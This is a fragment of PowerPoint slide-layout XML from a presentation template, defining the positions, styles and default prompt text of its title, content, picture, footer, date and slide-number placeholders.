              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Footer Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0B12CFE6-D05E-5478-B3A4-81DC4DCD7410}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4642867" y="110365"/>
            <a:ext cx="4011929" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>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626B86D3-24E1-029E-BA22-9F17F9517D65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8822095" y="11036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7" name="Content Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{28C8B19A-6FC1-2B71-0BFB-9274CBF396B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="13"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4642866" y="2740228"/>
            <a:ext cx="4429982" cy="4096512"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="257175" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="428625" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="600075" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="771525" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
              <a:defRPr sz="1050"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="942975" indent="-257175">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>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46576925"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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ntent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C0178B15-836F-D50E-D616-40C9373248FF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="404734" y="987552"/>
            <a:ext cx="4024860" cy="4044508"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83A196D4-110B-6911-7AF5-9149D3FFF8BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="399113" y="100702"/>
            <a:ext cx="4024860" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Date Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8D9253F-93F3-9EB9-BFA6-49C9461DE0DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4642866" y="100702"/>
            <a:ext cx="2205337"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9" name="Slide Number Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B94C6C96-D651-5D6B-830B-07E5A35424C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8329299"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8" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FFB4667A-FE47-8556-FD3A-55FDBA801D76}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="13"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4642866" y="969264"/>
            <a:ext cx="4002565" cy="4818062"/>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738637895"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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Content 3">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4622" y="988980"/>
            <a:ext cx="2597159" cy="2942419"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{37A9910B-18FC-4A92-025A-A88AC7CD6B13}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="399113" y="100702"/>
            <a:ext cx="2602668" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Date Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{10752728-D41A-655E-871F-F76147E0E991}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3237876" y="100702"/>
            <a:ext cx="2205337"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9" name="Slide Number Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE07CC96-728B-298D-B2D6-54C4E9F0E9CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8329299"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8" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8C71126E-AEFA-B45A-CD39-AC1315E03339}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="13"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3237876" y="967689"/>
            <a:ext cx="5413328" cy="52371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4071215230"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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Content with Picture">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B7D0064E-1F0E-2DDF-C6B5-9CE196C4B560}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3784354" y="612140"/>
            <a:ext cx="4874741" cy="1519612"/>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3603009" cy="6858000"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr lang="en-US" dirty="0"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D478DAE4-13AB-5772-07E6-B3264F1E3141}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3828091" y="2457407"/>
            <a:ext cx="4831004" cy="3778977"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t"/>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Footer Placeholder 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C65BFCB1-FAA8-D03A-3B62-DCB2CF1CA112}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3828092" y="6452991"/>
            <a:ext cx="1476281" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Slide Number Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0A608994-46CD-AAE0-DCC4-A59D26254D84}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8337190" y="6452990"/>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4147377023"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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Content with Picture 2">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Title 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3CDF6858-35EF-4C90-B3F5-339B7EF1F60F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3211345" y="621793"/>
            <a:ext cx="5439533" cy="1138769"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t"/>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0" y="1"/>
            <a:ext cx="3017520" cy="6858000"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{72FCF01F-6AD4-FD29-865E-65BD55CF89DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3231817" y="2115404"/>
            <a:ext cx="5419061" cy="4212926"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t" anchorCtr="0"/>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0" name="Footer Placeholder 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F9B8FC8-8820-A655-2A18-E8F8FC2C72DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3211345" y="6492876"/>
            <a:ext cx="1476281" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Date Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8C032E2-BBA3-EA74-8FE1-5AFC46A21AE1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="18"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6767927" y="6492876"/>
            <a:ext cx="1197150" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>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2" name="Slide Number Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D28087CA-07B9-D0D2-3AA7-C34B5C9645B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8328973" y="6492876"/>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420692008"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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Content with Picture 3">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Title 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A932ED1-5750-0D24-8D58-961B6F20FA21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="406730" y="621793"/>
            <a:ext cx="5439533" cy="1138769"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:body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01598DB3-17DB-7EDD-0F42-9866A753C2DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="19"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="427202" y="2115404"/>
            <a:ext cx="5419061" cy="4212926"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t" anchorCtr="0"/>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3" name="Picture Placeholder 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6C5AB1A9-786B-C92B-C6EA-63CE0AACFB1E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6126480" y="1"/>
            <a:ext cx="3017520" cy="6858000"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C6115057-015C-DC83-074A-D22D9E0B6CD2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="406731" y="6492876"/>
            <a:ext cx="1476281" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Date Placeholder 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42028964-5597-F5F0-6AEA-C79255C9BCE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="18"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3963313" y="6492876"/>
            <a:ext cx="1197150"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6" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B6324527-5F82-8213-FFB9-A5E6BEB2314F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5524358" y="6492876"/>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276978386"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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Content with Picture 4">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15000-16D8-B5F1-E35B-BAE97B4E6EE4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="388961" y="621793"/>
            <a:ext cx="3995013" cy="1507454"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t" anchorCtr="0"/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B022A1E6-0A6D-9476-5034-0BDE3EE38B91}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="19"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="388963" y="2513110"/>
            <a:ext cx="3995012" cy="3568006"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t" anchorCtr="0"/>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1" name="Picture Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6B8D4096-4B0D-5226-C004-475A83BE8BFE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" sz="quarter" idx="18" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4731631" y="0"/>
            <a:ext cx="4412369" cy="6858000"/>
          </a:xfrm>
          <a:blipFill>
            <a:blip r:embed="rId2">
              <a:alphaModFix amt="70000"/>
            </a:blip>
            <a:stretch>
              <a:fillRect/>
            </a:stretch>
          </a:blipFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Footer Placeholder 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8917C8CF-AEBF-835D-4503-06A0208049F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="388962" y="6450238"/>
            <a:ext cx="1476281" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
